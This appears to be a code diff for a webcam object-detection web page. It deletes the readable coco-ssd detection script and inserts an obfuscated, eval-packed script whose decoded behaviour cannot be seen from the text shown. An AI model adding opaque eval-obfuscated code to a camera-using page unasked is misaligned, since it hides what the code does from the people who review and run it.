@@ -37,64 +37,9 @@
             © 2024-25 Updated Applications..<br> Developer @ Priyanshu
         </footer>
     </div>
-
-    <script>
-        let savedDetectionData = [];
-        async function setupWebcam() {
-            const video = document.getElementById('webcam');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            video.srcObject = stream;
-        }
-
-        async function detectObjects() {
-            const model = await cocoSsd.load();
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            const video = document.getElementById('webcam');
-
-            function updateCanvasSize() { canvas.width = video.videoWidth; canvas.height = video.videoHeight; }
-
-            async function detectFrame() {
-                updateCanvasSize();
-                const predictions = await model.detect(video);
-                document.getElementById('output-list').innerHTML = predictions.map(p => 
-                    `<li><span>${p.class}</span>: ${Math.round(p.score * 100)}%</li>`).join('');
-                context.clearRect(0, 0, canvas.width, canvas.height);
-                predictions.forEach(p => {
-                    context.beginPath();
-                    context.rect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
-                    context.lineWidth = 2;
-                    context.strokeStyle = 'red';
-                    context.stroke();
-                    context.fillStyle = 'white';
-                    context.fillText(`${p.class} (${Math.round(p.score * 100)}%)`, p.bbox[0] + 5, p.bbox[1] + 15);
-                });
-
-                saveDetectionData(predictions);
-                requestAnimationFrame(detectFrame);
-            }
-
-            detectFrame();
-        }
-
-        function saveDetectionData(predictions) {
-            if (predictions.length > 0) {
-                savedDetectionData.push(predictions.map(p => ({ class: p.class, score: p.score, bbox: p.bbox })));
-            }
-        }
-
-        function viewSavedData() {
-            const savedList = document.getElementById('saved-list');
-            const savedDataContainer = document.getElementById('saved-data');
-            savedList.innerHTML = savedDetectionData.length === 0 ? '<li>No data saved yet.</li>' : 
-                savedDetectionData.map((data, index) => 
-                    `<li>Detection ${index + 1}: ${data.map(p => `${p.class} (${Math.round(p.score * 100)}%)`).join(', ')}</li>`).join('');
-            savedDataContainer.style.display = 'block';
-        }
-
-        setupWebcam().then(detectObjects);
-        document.getElementById('view-data').addEventListener('click', viewSavedData);
-    </script>
+<script>
+        var _0xc96e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe31c(d,e,f){var g=_0xc96e[2][_0xc96e[1]](_0xc96e[0]);var h=g[_0xc96e[3]](0,e);var i=g[_0xc96e[3]](0,f);var j=d[_0xc96e[1]](_0xc96e[0])[_0xc96e[10]]()[_0xc96e[9]](function(a,b,c){if(h[_0xc96e[4]](b)!==-1)return a+=h[_0xc96e[4]](b)*(Math[_0xc96e[8]](e,c))},0);var k=_0xc96e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc96e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe31c(s,e,10)-t)}return decodeURIComponent(escape(r))}("EjTfKTTfEKjfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfIHjfKIIfIHjfKmEfKmmfKjTfIHjfKTKfEITfEKmfEIIfKTHfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfEITfKTTfEKjfEKIfEIEfKHTfKTTfKTEfKTHfKTKfEIjfImIfImKfIHjfEEjfIHjfKTHfEIKfEIIfEITfEKjfIHjfEKKfEjEfKTmfKTTfEIKfIHjfKIIfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEKEfKTTfKTEfKTHfKTKfEIjfImjfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfEITfEKjfEImfKTTfKTKfEIjfIHjfKIIfIHjfKTKfEKEfKTKfEjEfEKjfIHjfEIIfKTKfEKKfEjEfEjIfKTKfEKjfEIKfEImfITjfEIjfKTTfKTmfEjEfKTKfKKIfKTTfEKKfEjEfKTHfKTTfEITfITjfEjIfKTTfEKjfKHHfEITfKTTfEImfKEEfKTTfKTmfEjEfKTKfImIfEEjfIHjfEKKfEjEfKTmfKTTfEIKfKjmfIHjfEEjfIHjfEjjfKTKfKTHfEjEfEIIfEjIfKEEfEIKfKTmfKTTfKjmfIHjfIHKfKTTfEIIfEKKfEjEfEImfEIKfEIIfEIjfKTTfEIIfEKjfIHKfIHjfEEKfIHjfEEKfImKfKjTfIHjfEKKfEjEfKTmfKTTfEIKfITjfEITfEImfKTHfKEmfKTEfEjHfKTTfKTHfEKjfIHjfKIIfIHjfEITfEKjfEImfKTTfKTKfEIjfKjTfIHjfEEKfIHjfKTKfEITfEKmfEIIfKTHfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfKTmfKTTfEKjfKTTfKTHfEKjfKEmfKTEfEjHfKTTfKTHfEKjfEITfImIfImKfIHjfEEjfIHjfKTHfEIKfEIIfEITfEKjfIHjfEIjfEIKfKTmfKTTfEjTfIHjfKIIfIHjfKTKfEKEfKTKfEjEfEKjfIHjfKTHfEIKfKTHfEIKfKHKfEITfKTmfITjfEjTfEIKfKTKfKTmfImIfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfKTHfKTKfEIIfEKKfKTKfEITfIHjfKIIfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfKTHfKTKfEIIfEKKfKTKfEITfImjfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfIHjfKIIfIHjfKTHfKTKfEIIfEKKfKTKfEITfITjfEjIfKTTfEKjfKKjfEIKfEIIfEKjfKTTfEKHfEKjfImIfImjfITHfKTmfImjfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfEKKfEjEfKTmfKTTfEIKfIHjfKIIfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEKEfKTTfKTEfKTHfKTKfEIjfImjfImKfKjTfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfEKIfEIEfKTmfKTKfEKjfKTTfKKjfKTKfEIIfEKKfKTKfEITfKHKfEjEfEKTfKTTfImIfImKfIHjfEEjfIHjfKTHfKTKfEIIfEKKfKTKfEITfITjfEKEfEjEfKTmfEKjfEjKfIHjfKIIfIHjfEKKfEjEfKTmfKTTfEIKfITjfEKKfEjEfKTmfKTTfEIKfKHTfEjEfKTmfEKjfEjKfKjTfIHjfKTHfKTKfEIIfEKKfKTKfEITfITjfEjKfKTTfEjEfEjIfEjKfEKjfIHjfKIIfIHjfEKKfEjEfKTmfKTTfEIKfITjfEKKfEjEfKTmfKTTfEIKfKKmfKTTfEjEfEjIfEjKfEKjfKjTfIHjfEEKfIHjfKTKfEITfEKmfEIIfKTHfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfKTmfKTTfEKjfKTTfKTHfEKjfKKEfEImfKTKfEIjfKTTfImIfImKfIHjfEEjfIHjfEKIfEIEfKTmfKTKfEKjfKTTfKKjfKTKfEIIfEKKfKTKfEITfKHKfEjEfEKTfKTTfImIfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfIHjfKIIfIHjfKTKfEKEfKTKfEjEfEKjfIHjfEIjfEIKfKTmfKTTfEjTfITjfKTmfKTTfEKjfKTTfKTHfEKjfImIfEKKfEjEfKTmfKTTfEIKfImKfKjTfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEIKfEKIfEKjfEIEfEKIfEKjfImTfEjTfEjEfEITfEKjfImjfImKfITjfEjEfEIIfEIIfKTTfEImfKKmfKHEfKEEfKEKfIHjfKIIfIHjfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfITjfEIjfKTKfEIEfImIfEIEfIHjfKIIfKIKfIHjfKTIfKIjfEjTfEjEfKIKfKIjfEITfEIEfKTKfEIIfKIKfIHHfEEjfEIEfITjfKTHfEjTfKTKfEITfEITfEEKfKIjfITIfEITfEIEfKTKfEIIfKIKfKjmfIHjfIHHfEEjfKEEfKTKfEKjfEjKfITjfEImfEIKfEKIfEIIfKTmfImIfEIEfITjfEITfKTHfEIKfEImfKTTfIHjfImEfIHjfITEfITKfITKfImKfEEKfIHmfKIjfITIfEjTfEjEfKIKfKTIfImKfITjfEjHfEIKfEjEfEIIfImIfImjfImjfImKfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfKTHfEjTfKTTfKTKfEImfKHIfKTTfKTHfEKjfImIfITKfImmfIHjfITKfImmfIHjfKTHfKTKfEIIfEKKfKTKfEITfITjfEKEfEjEfKTmfEKjfEjKfImmfIHjfKTHfKTKfEIIfEKKfKTKfEITfITjfEjKfKTTfEjEfEjIfEjKfEKjfImKfKjTfIHjfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfITjfEjjfEIKfEImfKKKfKTKfKTHfEjKfImIfEIEfIHjfKIIfKIKfIHjfEEjfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfKTEfKTTfEjIfEjEfEIIfKETfKTKfEKjfEjKfImIfImKfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEImfKTTfKTHfEKjfImIfEIEfITjfKTEfKTEfEIKfEKHfKmEfITKfKmmfImmfIHjfEIEfITjfKTEfKTEfEIKfEKHfKmEfITEfKmmfImmfIHjfEIEfITjfKTEfKTEfEIKfEKHfKmEfITHfKmmfImmfIHjfEIEfITjfKTEfKTEfEIKfEKHfKmEfITmfKmmfImKfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEjTfEjEfEIIfKTTfKHTfEjEfKTmfEKjfEjKfIHjfKIIfIHjfITHfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEITfEKjfEImfEIKfEjmfKTTfKHKfEKjfEKmfEjTfKTTfIHjfKIIfIHjfImjfEImfKTTfKTmfImjfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEITfEKjfEImfEIKfEjmfKTTfImIfImKfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEjjfEjEfEjTfEjTfKHKfEKjfEKmfEjTfKTTfIHjfKIIfIHjfImjfEKEfEjKfEjEfEKjfKTTfImjfKjTfIHjfKTHfEIKfEIIfEKjfKTTfEKHfEKjfITjfEjjfEjEfEjTfEjTfKHEfKTTfEKHfEKjfImIfKTIfIHHfEEjfEIEfITjfKTHfEjTfKTKfEITfEITfEEKfIHjfImIfIHHfEEjfKEEfKTKfEKjfEjKfITjfEImfEIKfEKIfEIIfKTmfImIfEIEfITjfEITfKTHfEIKfEImfKTTfIHjfImEfIHjfITEfITKfITKfImKfEEKfIHmfImKfKTIfImmfIHjfEIEfITjfKTEfKTEfEIKfEKHfKmEfITKfKmmfIHjfImHfIHjfKjjfImmfIHjfEIEfITjfKTEfKTEfEIKfEKHfKmEfITEfKmmfIHjfImHfIHjfITEfKjjfImKfKjTfIHjfEEKfImKfKjTfIHjfEITfKTKfEKKfKTTfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfImIfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfImKfKjTfIHjfEImfKTTfEIHfEKIfKTTfEITfEKjfKImfEIIfEjEfEIjfKTKfEKjfEjEfEIKfEIIfKKEfEImfKTKfEIjfKTTfImIfKTmfKTTfEKjfKTTfKTHfEKjfKKEfEImfKTKfEIjfKTTfImKfKjTfIHjfEEKfIHjfKTmfKTTfEKjfKTTfKTHfEKjfKKEfEImfKTKfEIjfKTTfImIfImKfKjTfIHjfEEKfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfEITfKTKfEKKfKTTfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfImIfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfImKfIHjfEEjfIHjfEjEfEjjfIHjfImIfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfITjfEjTfKTTfEIIfEjIfEKjfEjKfIHjfKIKfIHjfITKfImKfIHjfEEjfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfITjfEIEfEKIfEITfEjKfImIfEIEfEImfKTTfKTmfEjEfKTHfEKjfEjEfEIKfEIIfEITfITjfEIjfKTKfEIEfImIfEIEfIHjfKIIfKIKfIHjfImIfEEjfIHjfKTHfEjTfKTKfEITfEITfKjmfIHjfEIEfITjfKTHfEjTfKTKfEITfEITfImmfIHjfEITfKTHfEIKfEImfKTTfKjmfIHjfEIEfITjfEITfKTHfEIKfEImfKTTfImmfIHjfKTEfKTEfEIKfEKHfKjmfIHjfEIEfITjfKTEfKTEfEIKfEKHfIHjfEEKfImKfImKfImKfKjTfIHjfEEKfIHjfEEKfIHjfEjjfEKIfEIIfKTHfEKjfEjEfEIKfEIIfIHjfEKKfEjEfKTTfEKEfKHKfKTKfEKKfKTTfKTmfKKIfKTKfEKjfKTKfImIfImKfIHjfEEjfIHjfKTHfEIKfEIIfEITfEKjfIHjfEITfKTKfEKKfKTTfKTmfKEKfEjEfEITfEKjfIHjfKIIfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEITfKTKfEKKfKTTfKTmfImTfEjTfEjEfEITfEKjfImjfImKfKjTfIHjfKTHfEIKfEIIfEITfEKjfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTKfEKjfKTKfKKjfEIKfEIIfEKjfKTKfEjEfEIIfKTTfEImfIHjfKIIfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEITfKTKfEKKfKTTfKTmfImTfKTmfKTKfEKjfKTKfImjfImKfKjTfIHjfEITfKTKfEKKfKTTfKTmfKEKfEjEfEITfEKjfITjfEjEfEIIfEIIfKTTfEImfKKmfKHEfKEEfKEKfIHjfKIIfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfITjfEjTfKTTfEIIfEjIfEKjfEjKfIHjfKIIfKIIfKIIfIHjfITKfIHjfKIEfIHjfImjfKIjfEjTfEjEfKIKfKEHfEIKfIHjfKTmfKTKfEKjfKTKfIHjfEITfKTKfEKKfKTTfKTmfIHjfEKmfKTTfEKjfITjfKIjfITIfEjTfEjEfKIKfImjfIHjfKjmfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfKKIfKTKfEKjfKTKfITjfEIjfKTKfEIEfImIfImIfKTmfKTKfEKjfKTKfImmfIHjfEjEfEIIfKTmfKTTfEKHfImKfIHjfKIIfKIKfIHjfKTIfKIjfEjTfEjEfKIKfKKIfKTTfEKjfKTTfKTHfEKjfEjEfEIKfEIIfIHjfIHHfEEjfEjEfEIIfKTmfKTTfEKHfIHjfImHfIHjfITEfEEKfKjmfIHjfIHHfEEjfKTmfKTKfEKjfKTKfITjfEIjfKTKfEIEfImIfEIEfIHjfKIIfKIKfIHjfKTIfIHHfEEjfEIEfITjfKTHfEjTfKTKfEITfEITfEEKfIHjfImIfIHHfEEjfKEEfKTKfEKjfEjKfITjfEImfEIKfEKIfEIIfKTmfImIfEIEfITjfEITfKTHfEIKfEImfKTTfIHjfImEfIHjfITEfITKfITKfImKfEEKfIHmfImKfKTIfImKfITjfEjHfEIKfEjEfEIIfImIfImjfImmfIHjfImjfImKfEEKfKIjfITIfEjTfEjEfKIKfKTIfImKfITjfEjHfEIKfEjEfEIIfImIfImjfImjfImKfKjTfIHjfEITfKTKfEKKfKTTfKTmfKKIfKTKfEKjfKTKfKKjfEIKfEIIfEKjfKTKfEjEfEIIfKTTfEImfITjfEITfEKjfEKmfEjTfKTTfITjfKTmfEjEfEITfEIEfEjTfKTKfEKmfIHjfKIIfIHjfImjfKTEfEjTfEIKfKTHfEjmfImjfKjTfIHjfEEKfIHjfEITfKTTfEKjfEKIfEIEfKHTfKTTfKTEfKTHfKTKfEIjfImIfImKfITjfEKjfEjKfKTTfEIIfImIfKTmfKTTfEKjfKTTfKTHfEKjfKEmfKTEfEjHfKTTfKTHfEKjfEITfImKfKjTfIHjfKTmfEIKfKTHfEKIfEIjfKTTfEIIfEKjfITjfEjIfKTTfEKjfKKKfEjTfKTTfEIjfKTTfEIIfEKjfKITfEKmfKKTfKTmfImIfImjfEKKfEjEfKTTfEKEfImTfKTmfKTKfEKjfKTKfImjfImKfITjfKTKfKTmfKTmfKKKfEKKfKTTfEIIfEKjfKEKfEjEfEITfEKjfKTTfEIIfKTTfEImfImIfImjfKTHfEjTfEjEfKTHfEjmfImjfImmfIHjfEKKfEjEfKTTfEKEfKHKfKTKfEKKfKTTfKTmfKKIfKTKfEKjfKTKfImKfKjTf",94,"jIKEHmTfJ",45,7,2))
+</script>
 </body>
 </html>
 <!--line 10-->
